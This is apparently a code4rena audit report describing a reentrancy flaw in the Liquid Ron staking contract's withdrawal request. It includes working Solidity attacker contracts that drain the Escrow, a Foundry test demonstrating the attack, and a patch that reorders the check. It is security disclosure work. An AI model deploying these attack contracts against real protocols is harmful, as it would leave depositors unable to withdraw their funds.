# Audit Findings – Liquid Ron

**Platform:** code4rena  
**Contest:** [Liquid Ron](https://code4rena.com/audits/2025-01-liquid-ron)  
**Dates:** Jan 29, 2025 - Feb 5, 2025   
**Role:** Independent Warden   
**Findings accepted:** 1 Low

---

## 🟦 Low Severity Findings

### L-01: Reentrancy vulnerability allows owner/operator to cause permanent loss of funds to users who request withdrawal

#### Description and impact
LiquidRon:L352 results in a call back to the `msg.sender` on LiquidRon:L430. This allows for re-entrancy. During the resulting execution of the fallback of the attacking contract it is possible for it to call `LiquidRon::finaliseRonRewardsForEpoch` - assuming that it has been granted owner/operator privileges. At this point, the amount of `lockedShares` will be less than what will be eventually required (as LiquidRon:L354 has not been executed yet). The amount of assets withdrawn to the escrow on LiquidRon:L251 will be insufficient to meet the amount required by the users. After the attacker's fallback is finished, the attacker's requested withdrawal amount is increased, and they can then call the custom `redeem` function immediately.

After the attack, the Wrapped Ron balance of the `Escrow` decreases by the amount the attacker uses in their withdrawal. As shown in the proof of concept below, it is possible for the attacker to perform the withdrawal multiple times in the same transaction. In this case, the amount taken from the `Escrow` is equal to the funds used by the attacker multiplied by the number of times they call the custom `redeem` function (which is limited only by gas usage). As a result, all funds from the `Escrow` can be drained in a single transaction even if the attacker owns a much smaller amount of Ron than what is in the `Escrow`. The users who called `LiquidRon::requestWithdrawal` can now no longer redeem their funds. The assets taken from the `Escrow` end up going back to the LiquidRon contract (the attacker does not gain or lose any assets as a result of the attack).

Although the attacker does not profit financially, the impact is significant: the users who requested withdrawal are unable to withdraw - unless, in the future, other users request withdrawal and the `LiquidRon::finaliseRonRewardsForEpoch` is called again. In this case, there may be enough assets in the `Escrow` for some users to withdraw but not enough to meet all withdrawals. Therefore this attack results in permanent loss of funds. The attack vector requires abuse of owner/operator privileges in a manner unintended by the protocol. Moreover, the attack violates the intended privileges assigned to the operators: according to the contest description "Operators can only direct the flow of assets from and to the proxies and proxies to the staking protocol."

Note: there is a slightly different situation in which the attacker could make a profit. This would occur if the LiquidRon traded on a DEX and the price of LiquidRon on the DEX was less than the price obtained based on asset/share supply in the `LiquidRon `contract. The cost per share to acquire the `LiquidRon` shares (on the DEX) would be less than the amount received per share during each call to the `LiquidRon`'s custom `redeem` function. It would be possible to update the POC below to cater for this by replacing the use of `LiquidRon::deposit` function with the DEX's swap function in the attacking contract.

Although the impact is high, the judges considered this a low severity finding. Based on Code4rena's judging criteria, abuse of admin privelages is considered low severity at most.

#### Proof of Concept
The following attack contracts can be used together. Essentially, there are multiple `WithdrawalAttacker`s used and each of them perform the withdrawal request and call to the custom `redeem` function. The redeemed amount is recycled each time by re-depositing it, and transferring the shares to another `WithdrawalAttacker`. The amount drained from the `Escrow` is equal to the number of `WithdrawalAttacker`s used multiplied by the `msg.value` sent by the attacker when they call `WithdrawalAttackOrchestrator::executeAttack`.

```solidity
contract WithdrawalAttacker {
    LiquidRon liquidRon;
    WithdrawalAttacker prevAttacker;
    WithdrawalAttacker nextAttacker;
    address destination;
    address originalOwner;
    bool reenter;
    uint256 sharesToWithdraw;

    constructor(LiquidRon _liquidRon, address _destination, address _originalOwner, uint256 _sharesToWithdraw) {
        liquidRon = _liquidRon;
        destination = _destination;
        originalOwner = _originalOwner;
        sharesToWithdraw = _sharesToWithdraw;
    }

    function setPrevAttacker(WithdrawalAttacker _prevAttacker) external {
        prevAttacker = _prevAttacker;
    }

    function setNextAttacker(WithdrawalAttacker _nextAttacker) external {
        nextAttacker = _nextAttacker;
    }

    function attackEntry() public {
        if (address(nextAttacker) == address(0)) {
            liquidRon.deposit{value: address(this).balance}();
        }

        uint256 shareBalance = liquidRon.balanceOf(address(this));
        reenter = true;
        liquidRon.requestWithdrawal(sharesToWithdraw);
        reenter = false;

        // Due to re-entrancy, we can redeem immediately
        liquidRon.redeem(liquidRon.withdrawalEpoch() - 1);

        if (address(prevAttacker) != address(0)) {
            // Re-deposit the redeemed amount so it can be used by the `prevAttacker`
            liquidRon.deposit{value: address(this).balance}();
            liquidRon.transfer(address(prevAttacker), liquidRon.balanceOf(address(this)));
        } else {
            // Now we are finished, so send the funds back to the required destination address
            (bool success,) = destination.call{value: address(this).balance}("");
            require(success, "Must transfer to destination");
        }
    }

    fallback() external payable {
        if (reenter) {
            if (address(nextAttacker) == address(0)) {
                // The last attacker can finalise the rewards and transfer the ownership back
                liquidRon.finaliseRonRewardsForEpoch();
                liquidRon.transferOwnership(originalOwner);
            } else {
                // Make another call to request withdrawal but from a different address
                nextAttacker.attackEntry();
            }
        }
    }
}

contract WithdrawalAttackOrchestrator {
    WithdrawalAttacker first;
    WithdrawalAttacker last;
    LiquidRon liquidRon;

    constructor(LiquidRon _liquidRon, uint256 _numAttackers, uint256 _sharesToWithdraw) {
        liquidRon = _liquidRon;
        WithdrawalAttacker prev;
        for (uint256 i = 0; i < _numAttackers; i++) {
            WithdrawalAttacker attacker = new WithdrawalAttacker(_liquidRon, msg.sender, msg.sender, _sharesToWithdraw);
            if (i == 0) {
                first = attacker;
            }
            if (i == _numAttackers - 1) {
                last = attacker;
            }

            if (address(prev) != address(0)) {
                attacker.setPrevAttacker(prev);
                prev.setNextAttacker(attacker);
            }

            prev = attacker;
        }
    }

    function executeAttack() external payable {
        liquidRon.transferOwnership(address(last));
        // The `last` needs Ron to be able to make the initial deposit so we make a transfer to it
        (bool success,) = address(last).call{value: address(this).balance}("");
        require(success, "Must transfer to the last attacker");
        first.attackEntry();
    }
}
```

The attack is demonstrated by adding the below test case to `LiquidRonTest`:

```solidity
    function test_reentrancyRequestWithdrawal() public {
        // Victim deposits and requests withdrawal
        address victim = address(0x123);
        vm.deal(victim, 1000 ether);
        uint256 victimDepositAmount = 100 ether;
        vm.prank(victim);
        liquidRon.deposit{value: victimDepositAmount}();
        uint256 victimInitialShares = liquidRon.balanceOf(victim);
        vm.assertEq(victimInitialShares, victimDepositAmount, "Victim's initial share balance is equal to deposit amount");
        vm.prank(victim);
        liquidRon.requestWithdrawal(victimInitialShares);
        vm.assertEq(liquidRon.totalSupply(), victimInitialShares, "Must have expected initial total supply");
        vm.assertEq(liquidRon.totalAssets(), victimDepositAmount, "Must have expected initial total assets");

        uint256 attackerInitialBalance = address(this).balance;
        WithdrawalAttackOrchestrator attackOrchestrator = new WithdrawalAttackOrchestrator(liquidRon, 10, 10 ether);
        liquidRon.transferOwnership(address(attackOrchestrator));
        // Note - the attack is performed using less than the withdrawal amount requested by the victim
        attackOrchestrator.executeAttack{value: 10 ether}();
        vm.assertEq(address(this).balance, attackerInitialBalance, "Attacker balance remains unchanged");
        vm.assertEq(liquidRon.totalSupply(), victimInitialShares, "Total supply remains unchanged");
        vm.assertEq(liquidRon.totalAssets(), victimDepositAmount, "Total assets remains unchanged");
        vm.assertEq(wrappedRon.balanceOf(liquidRon.escrow()), 0, "Escrow funds are drained during attack");

        uint256 epoch = liquidRon.withdrawalEpoch() - 1;
        vm.prank(victim);
        vm.expectRevert();
        liquidRon.redeem(epoch); // Reverts due to insufficient balance of the Escrow

        vm.assertEq(liquidRon.balanceOf(victim), 0, "Victim's balance is zero (so they cannot request withdrawal again)"); 
    }
```

You can run it using:

```
forge test --match-contract LiquidRonTest --match-test test_reentrancyRequestWithdrawal
```

#### Recommendation
Modify LiquidRon::requestWithdrawal so the call to `_checkUserCanReceiveRon` can be moved to after the state updates:

```diff
     function requestWithdrawal(uint256 _shares) external whenNotPaused {
         uint256 epoch = withdrawalEpoch;
         WithdrawalRequest storage request = withdrawalRequestsPerEpoch[epoch][msg.sender];
 
-        _checkUserCanReceiveRon(msg.sender);
         request.shares += _shares;
         lockedSharesPerEpoch[epoch] += _shares;
         _transfer(msg.sender, address(this), _shares);
+        _checkUserCanReceiveRon(msg.sender);
         emit WithdrawalRequested(msg.sender, epoch, _shares);
     }
```

**Submission details:** https://code4rena.com/audits/2025-01-liquid-ron/submissions/S-744
